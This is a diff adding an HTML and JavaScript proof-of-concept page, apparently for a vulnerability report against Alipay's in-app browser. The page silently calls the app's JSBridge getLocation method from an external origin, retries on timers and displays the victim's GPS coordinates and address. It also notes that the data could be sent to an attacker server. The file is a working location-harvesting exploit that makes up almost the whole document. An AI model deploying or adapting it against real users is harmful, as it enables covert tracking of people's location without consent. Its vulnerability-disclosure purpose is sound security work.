@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html><head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>CVE-2 Verification</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,system-ui,sans-serif;background:#fff;color:#333;padding:16px}
+.banner{background:#f5222d;color:#fff;padding:16px;border-radius:10px;text-align:center;margin-bottom:16px}
+.banner h1{font-size:18px}
+.banner p{font-size:12px;opacity:.85;margin-top:4px}
+.result{background:#f6ffed;border:2px solid #52c41a;border-radius:10px;padding:16px;margin:12px 0}
+.result h2{color:#389e0d;font-size:15px;margin-bottom:8px}
+.fail{background:#fff2f0;border-color:#ff4d4f}
+.fail h2{color:#cf1322}
+.pending{background:#fffbe6;border-color:#faad14}
+.pending h2{color:#d48806}
+.item{padding:6px 0;border-bottom:1px solid #f0f0f0;font-size:13px}
+.item:last-child{border:none}
+.label{color:#888;font-size:11px}
+.value{color:#333;font-weight:600}
+.ts{color:#999;font-size:10px;text-align:center;margin-top:16px}
+#status{font-size:14px;color:#1677ff;text-align:center;padding:20px}
+.map{width:100%;height:200px;background:#e6f7ff;border-radius:8px;display:flex;align-items:center;justify-content:center;margin:8px 0;font-size:12px;color:#096dd9}
+</style>
+</head><body>
+
+<div class="banner">
+  <h1>CVE-2: GPS Silent Exfiltration</h1>
+  <p>CWE-359 | CVSS 7.4 | getLocation called from external page</p>
+</div>
+
+<div id="status">Waiting for AlipayJSBridge...</div>
+<div id="results"></div>
+<div class="ts" id="timestamp"></div>
+
+<script>
+var el = document.getElementById('results');
+var status = document.getElementById('status');
+var gpsAttempts = 0;
+var gpsResults = [];
+
+function render() {
+  var html = '';
+  var isAlipay = /AlipayClient|Nebula/i.test(navigator.userAgent);
+
+  // Environment
+  html += '<div class="result"><h2>Environment</h2>';
+  html += '<div class="item"><span class="label">Page Origin: </span><span class="value">' + location.origin + '</span></div>';
+  html += '<div class="item"><span class="label">Inside Alipay: </span><span class="value" style="color:' + (isAlipay ? '#52c41a' : '#faad14') + '">' + (isAlipay ? 'YES' : 'Unknown') + '</span></div>';
+  html += '<div class="item"><span class="label">JSBridge: </span><span class="value">' + (window.AlipayJSBridge ? 'AVAILABLE' : 'Not loaded') + '</span></div>';
+  html += '</div>';
+
+  // GPS Results
+  if (gpsResults.length > 0) {
+    var latest = gpsResults[gpsResults.length - 1];
+    if (latest.success) {
+      html += '<div class="result"><h2>GPS EXFILTRATION SUCCESSFUL</h2>';
+      html += '<div class="item"><span class="label">Latitude: </span><span class="value" style="color:#f5222d;font-size:16px">' + latest.latitude + '</span></div>';
+      html += '<div class="item"><span class="label">Longitude: </span><span class="value" style="color:#f5222d;font-size:16px">' + latest.longitude + '</span></div>';
+      if (latest.accuracy) html += '<div class="item"><span class="label">Accuracy: </span><span class="value">' + latest.accuracy + 'm</span></div>';
+      if (latest.city) html += '<div class="item"><span class="label">City: </span><span class="value">' + latest.city + '</span></div>';
+      if (latest.province) html += '<div class="item"><span class="label">Province: </span><span class="value">' + latest.province + '</span></div>';
+      if (latest.country) html += '<div class="item"><span class="label">Country: </span><span class="value">' + latest.country + '</span></div>';
+      if (latest.address) html += '<div class="item"><span class="label">Address: </span><span class="value" style="word-break:break-all;font-size:11px">' + latest.address + '</span></div>';
+      html += '<div class="item"><span class="label">Timestamp: </span><span class="value">' + latest.time + '</span></div>';
+      html += '<div class="map">GPS: ' + latest.latitude + ', ' + latest.longitude + '</div>';
+      html += '</div>';
+
+      // Attack proof
+      html += '<div class="result"><h2>PROOF: Silent GPS Access from External Page</h2>';
+      html += '<div class="item"><span class="label">Attack: </span><span class="value" style="color:#f5222d">External attacker page obtained device GPS coordinates via JSBridge</span></div>';
+      html += '<div class="item"><span class="label">No user prompt: </span><span class="value">getLocation used Alipay\'s existing OS permission — no new permission dialog shown</span></div>';
+      html += '<div class="item"><span class="label">Root Cause: </span><span class="value">H5LocationPlugin.judgeGrant() only checks OS-level permission, not page origin</span></div>';
+      html += '<div class="item"><span class="label">Exfil possible: </span><span class="value">Coordinates can be sent to attacker server via fetch/Image/XHR</span></div>';
+      html += '</div>';
+    } else {
+      html += '<div class="result fail"><h2>getLocation Response</h2>';
+      html += '<div class="item"><span class="label">Error: </span><span class="value">' + (latest.error || 'Unknown error') + '</span></div>';
+      html += '<div class="item"><span class="label">Error Code: </span><span class="value">' + (latest.errorCode || 'N/A') + '</span></div>';
+      html += '<div class="item"><span class="label">Note: </span><span class="value">If location permission was never granted to Alipay, this is expected. Grant location permission to Alipay first, then retry.</span></div>';
+      html += '</div>';
+    }
+  } else if (window.AlipayJSBridge) {
+    html += '<div class="result pending"><h2>GPS Test In Progress...</h2>';
+    html += '<div class="item"><span class="label">Status: </span><span class="value">Calling getLocation via JSBridge...</span></div>';
+    html += '<div class="item"><span class="label">Attempts: </span><span class="value">' + gpsAttempts + '</span></div>';
+    html += '</div>';
+  }
+
+  // Raw data dump
+  if (gpsResults.length > 0) {
+    html += '<div class="result"><h2>Raw API Response</h2>';
+    html += '<div class="item"><span class="label">JSON: </span><span class="value" style="word-break:break-all;font-size:10px">' + JSON.stringify(gpsResults[gpsResults.length-1].raw) + '</span></div>';
+    html += '</div>';
+  }
+
+  el.innerHTML = html;
+  document.getElementById('timestamp').textContent = 'Evidence collected at: ' + new Date().toISOString();
+}
+
+function tryGetLocation() {
+  if (!window.AlipayJSBridge) return;
+  gpsAttempts++;
+
+  AlipayJSBridge.call('getLocation', {
+    type: 2,
+    accuracy: 1
+  }, function(result) {
+    var entry = {
+      time: new Date().toISOString(),
+      raw: result,
+      success: false
+    };
+
+    if (result && (result.longitude || result.latitude)) {
+      entry.success = true;
+      entry.latitude = result.latitude;
+      entry.longitude = result.longitude;
+      entry.accuracy = result.accuracy;
+      entry.city = result.city || result.cityCode;
+      entry.province = result.province || result.provinceCode;
+      entry.country = result.country || result.countryCode;
+      entry.address = result.address || result.streetNumber || '';
+
+      status.textContent = 'GPS OBTAINED — Location: ' + entry.latitude + ', ' + entry.longitude;
+      status.style.color = '#f5222d';
+    } else {
+      entry.success = false;
+      entry.error = result.error || result.errorMessage || JSON.stringify(result);
+      entry.errorCode = result.errorCode || result.error;
+      status.textContent = 'getLocation returned: ' + (entry.error || 'no data');
+      status.style.color = '#fa8c16';
+    }
+
+    gpsResults.push(entry);
+    render();
+  });
+
+  render();
+}
+
+function checkBridge() {
+  if (window.AlipayJSBridge) {
+    status.textContent = 'AlipayJSBridge detected — calling getLocation...';
+    status.style.color = '#1677ff';
+    tryGetLocation();
+  } else {
+    status.textContent = 'Page loaded at ' + location.origin + ' — waiting for bridge...';
+    render();
+  }
+}
+
+document.addEventListener('AlipayJSBridgeReady', function() {
+  checkBridge();
+});
+
+checkBridge();
+setTimeout(checkBridge, 1000);
+setTimeout(checkBridge, 3000);
+setTimeout(function() { tryGetLocation(); }, 5000);
+setTimeout(function() { tryGetLocation(); }, 8000);
+</script>
+</body></html>
